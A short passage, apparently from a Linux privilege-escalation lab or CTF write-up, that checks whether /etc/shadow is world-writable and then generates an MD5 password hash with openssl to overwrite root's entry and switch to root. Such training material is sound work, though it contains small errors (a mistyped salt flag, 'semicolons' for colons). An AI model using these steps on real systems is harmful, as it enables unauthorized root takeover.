Check /etc/shadow file permissions:

	ls -la /etc/shadow

You should seeâ€¦

	**-rw-rw-rw-**

This means that the owner, group and all users have read and write permission for the file. Big win for us.

## Generate new root password & Su2Root


	openssl passwd <-hash_format> -salt <any_word_as_salt> <The_actual_password>


Here we used passwd to specify that we want to generate a Linux hashed password, `-1` means MD5 hash and salt is `abc` then the actual password

	openssl passwd -1 salt abc password123

Example password:

This must be replaced between semicolons after the name:
`$1$WXYViePQ$KBzlD0/sekZbcbzvo1AHI.`
